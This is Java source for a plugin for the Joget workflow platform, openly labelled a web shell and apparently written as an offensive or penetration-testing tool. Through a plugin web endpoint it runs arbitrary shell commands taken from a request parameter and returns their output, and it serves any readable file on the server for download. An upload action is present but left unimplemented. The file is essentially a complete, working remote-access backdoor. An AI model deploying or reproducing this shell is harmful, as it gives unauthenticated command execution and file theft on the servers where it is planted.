package podalirius;

import org.apache.commons.lang3.SystemUtils;
import java.io.IOException;
import java.io.Writer;
import java.io.File;
import java.io.FileInputStream;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.Map;
import javax.servlet.ServletException;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.ServletOutputStream;
import org.joget.plugin.base.DefaultPlugin;
import org.joget.plugin.base.ExtDefaultPlugin;
import org.joget.plugin.base.PluginProperty;
import org.joget.plugin.base.PluginWebSupport;
import org.json.JSONObject;
import org.json.JSONException;

/**
 *
 * @author Podalirius
 */
public class WebShell extends ExtDefaultPlugin implements PluginWebSupport {

    public String getName() {
        return "JoGet WebShell plugin";
    }

    public String getVersion() {
        return "1.2";
    }

    public String getDescription() {
        return "JoGet WebShell plugin by @podalirius_";
    }

    public PluginProperty[] getPluginProperties() {
        return null;
    }

    public Object execute(Map properties) {
        return null;
    }

    @Override
    public void webService(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        String action = request.getParameter("action");

        if ("exec".equals(action)) {
            System.out.println("exec");
            String cmd = request.getParameter("cmd");
            action_exec(response.getWriter(), cmd);
        } else if ("download".equals(action)) {
            System.out.println("download");
            String path = request.getParameter("path");
            action_download(response, path);
        } else if ("upload".equals(action)) {
            System.out.println("upload");
            String path = request.getParameter("path");

        }
    }

    private void action_exec(Writer writer, String cmd) {
        String stdout = "";
        String stderr = "";
        String linebuffer = "";

        String[] commands = {"/bin/bash", "-c", cmd};

        if (SystemUtils.IS_OS_WINDOWS) {
            commands[0] = "cmd.exe";
            commands[1] = "/c";
        } else if (SystemUtils.IS_OS_AIX) {
            commands[0] = "/bin/ksh";
            commands[1] = "/c";
        } else if (SystemUtils.IS_OS_LINUX) {
            commands[0] = "/bin/bash";
            commands[1] = "-c";
        } else if (SystemUtils.IS_OS_MAC) {
            commands[0] = "/bin/dash";
            commands[1] = "-c";
        }

        try {
            Runtime rt = Runtime.getRuntime();
            Process proc = rt.exec(commands);
            BufferedReader stdInput = new BufferedReader(new InputStreamReader(proc.getInputStream()));
            BufferedReader stdError = new BufferedReader(new InputStreamReader(proc.getErrorStream()));
            // Read the output from the command
            while ((linebuffer = stdInput.readLine()) != null) { stdout += linebuffer+"\n"; }
            // Read any errors from the attempted command
            while ((linebuffer = stdError.readLine()) != null) { stderr += linebuffer+"\n"; }
        } catch(IOException e) {
            e.printStackTrace();
        }

        try {
            JSONObject result = new JSONObject();
            result.put("exec", commands);
            result.put("stdout", stdout);
            result.put("stderr", stderr);
            result.write(writer);
        } catch(JSONException e) {
            e.printStackTrace();
        }
    }

    private void action_download(HttpServletResponse response, String path) {
        if (path == null) {
            try {
                JSONObject result = new JSONObject();
                result.put("action", "download");
                result.put("error", "Missing 'path' argument in http request.");
                result.write(response.getWriter());
            } catch(Exception jsonerr) {
                jsonerr.printStackTrace();
            }
        } else {
            try {
                File f = new File(path);
                if (f.exists()) {
                    if (f.isFile()) {
                        if (f.canRead()) {
                            response.setContentType("application/octet-stream");
                            response.setHeader("Content-Disposition", "attachment;filename=\"" + f.getName() + "\"");
                            FileInputStream fileInputStream = new FileInputStream(path);
                            ServletOutputStream httpResponse = response.getOutputStream();
                            byte[] buffer = new byte[1024];
                            while (fileInputStream.available() > 0) {
                                fileInputStream.read(buffer);
                                httpResponse.write(buffer);
                            }
                            httpResponse.flush();
                            httpResponse.close();
                            fileInputStream.close();
                        } else {
                            try {
                                JSONObject result = new JSONObject();
                                result.put("action", "download");
                                result.put("error", "File " + path + " exists but is not readable.");
                                result.write(response.getWriter());
                            } catch(JSONException jsonerr) {
                                jsonerr.printStackTrace();
                            }
                        }
                    } else {
                        try {
                            JSONObject result = new JSONObject();
                            result.put("action", "download");
                            result.put("error", "Path " + path + " is not a file (maybe a directory or a pipe).");
                            result.write(response.getWriter());
                        } catch(JSONException jsonerr) {
                            jsonerr.printStackTrace();
                        }
                    }
                } else {
                    try {
                        JSONObject result = new JSONObject();
                        result.put("action", "download");
                        result.put("error", "Path " + path + " does not exist or is not readable.");
                        result.write(response.getWriter());
                    } catch(JSONException jsonerr) {
                        jsonerr.printStackTrace();
                    }
                }
            } catch (Exception err) {
               try {
                    JSONObject result = new JSONObject();
                    result.put("action", "download");
                    result.put("error", err.getMessage());
                    result.write(response.getWriter());
                } catch(Exception jsonerr) {
                    jsonerr.printStackTrace();
                }
            }
        }
    }
}
